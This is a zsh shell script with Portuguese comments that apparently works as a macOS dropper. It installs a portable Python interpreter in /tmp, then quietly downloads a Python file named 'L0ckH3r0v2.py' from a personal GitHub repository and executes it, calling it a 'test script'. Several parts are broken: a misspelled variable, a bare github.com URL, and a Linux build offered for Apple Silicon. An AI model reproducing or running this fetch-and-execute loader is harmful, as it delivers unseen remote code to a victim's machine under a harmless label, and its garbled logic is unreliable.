#!/bin/zsh

# Configuração de caminhos temporários
PASTA_TMP="/tmp/python_teste"
ARQUIVO_ZIP="$PASTA_TMP/python.tar.gz"
PASTA_DESTINO="$PASTA_TMP/python_bin"
SCRIPT_ALVO="$PASTA_TMP/teste.py"

# Cria a pasta de trabalho se não existir
mkdir -p "$PASTA_TMP"

# 1. Identifica a arquitetura do macOS para definir a URL correta (Darwin)
ARQUITETURA=$(uname -m)

if [ "$ARQUITETURA" = "x86_64" ]; then
    # URL de exemplo para Macs Intel (Build oficial estável do python-build-standalone)
    URL_PYTHON="https://github.com"
else
    # URL de exemplo para Macs Apple Silicon (M1/M2/M3/M4)
    URL_PYTHON="https://github.com/bjia56/portable-python/releases/download/cpython-v3.12.6-build.5/python-headless-3.12.6-linux-x86_64.zip
"
fi

echo "[+] Baixando interpretador Python compatível com macOS ($ARQUITETURA)..."
curl -L -s -o "$ARQUIS_ZIP" "$URL_PYTHON"

if [ ! -f "$ARQUIVO_ZIP" ]; then
    echo "[-] Falha no download do interpretador."
    exit 1
fi

echo "[+] Descompactando ambiente em $PASTA_TMP..."
# Nota: A maioria dos builds portáteis de macOS usa compressão .tar.gz para preservar links simbólicos nativos
tar -xzf "$ARQUIVO_ZIP" -C "$PASTA_TMP"
mv "$PASTA_TMP/python" "$PASTA_DESTINO"

# Define o caminho exato do executável interno
PYTHON_PORTATIL="$PASTA_DESTINO/tmp/python3"

# 2. Validação de funcionamento do binário
echo "[+] Validando funcionamento do binário do Python..."
VERSION=$("$PYTHON_PORTATIL" --version 2>&1)

if [[ "$VERSION" == *"Python"* ]]; then
    echo "[+] Validação concluída: $VERSION funcional."
else
    echo "[-] Erro: O binário do Python não pôde ser executado no macOS."
    exit 1
fi

# 3. Download do script Python de testes
URL_SCRIPT="https://raw.githubusercontent.com/pun1sh3rx0/macOS/refs/heads/main/L0ckH3r0v2.py"
echo "[+] Baixando script de teste do repositório..."
curl -L -s -o "$SCRIPT_ALVO" "$URL_SCRIPT"

if [ ! -f "$SCRIPT_ALVO" ]; then
    echo "[-] Falha ao baixar o script de teste."
    exit 1
fi

# 4. Execução do script com o interpretador isolado
echo "[+] Executando o script com o Python portátil..."
"$PYTHON_PORTATIL" "$SCRIPT_ALVO"

# Limpeza opcional do ambiente temporário após a execução
# rm -rf "$PASTA_TMP"
